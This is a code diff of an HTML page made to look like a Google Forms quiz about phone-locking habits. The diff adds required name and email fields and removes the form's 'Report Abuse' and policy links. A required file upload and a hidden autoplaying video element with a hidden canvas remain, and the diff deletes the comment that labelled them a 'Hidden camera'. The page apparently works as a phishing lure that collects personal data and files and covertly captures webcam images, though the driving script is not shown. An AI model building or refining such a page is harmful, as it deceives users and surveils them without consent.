@@ -27,6 +27,18 @@
       <!-- QUIZ FORM -->
       <form id="quiz-form">
 
+        <!-- Name -->
+        <div class="question-card">
+          <div class="question-title">Your Name <span class="required">*</span></div>
+          <input type="text" name="username" placeholder="Enter your name" required class="text-input">
+        </div>
+
+        <!-- Email -->
+        <div class="question-card">
+          <div class="question-title">Your Email <span class="required">*</span></div>
+          <input type="email" name="email" placeholder="Enter your email" required class="text-input">
+        </div>
+
         <!-- Question 1 -->
         <div class="question-card">
           <div class="question-title">Do you lock your phone with a PIN, PATTERN or FINGERPRINT? <span class="required">*</span></div>
@@ -74,7 +86,7 @@
           </div>
         </div>
 
-        <!-- File Upload Question -->
+        <!-- File Upload -->
         <div class="question-card file-upload">
           <div class="question-title">Please upload any file of your choice: <span class="required">*</span></div>
           <input type="file" id="user-file" required>
@@ -87,7 +99,7 @@
         </div>
       </form>
 
-      <!-- GOOGLE FOOTER -->
+      <!-- FOOTER -->
       <div class="google-footer">
         <p>Never submit passwords through Google Forms.</p>
         <div class="branding">
@@ -98,7 +110,7 @@
     </div>
 
     <!-- SUCCESS PAGE -->
-    <div class="form-wrapper success-wrapper" id="success-container" style="display: none;">
+    <div class="form-wrapper success-wrapper" id="success-container" style="display:none;">
       <div class="form-header">
         <div class="header-banner"></div>
         <div class="header-content">
@@ -110,18 +122,14 @@
         </div>
       </div>
       <div class="google-footer">
-        <div class="branding">This content is neither created nor endorsed by Google. <u>Report Abuse</u> - <u>Terms of Service</u> - <u>Privacy Policy</u></div>
+        <div class="branding">This content is neither created nor endorsed by Google.</div>
         <div class="google-logo">Google Forms</div>
       </div>
     </div>
-
   </div>
 
-  <!-- Hidden camera -->
   <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-
-  <!-- Toast -->
   <div id="toast" class="toast"></div>
 
   <script src="script.js"></script>
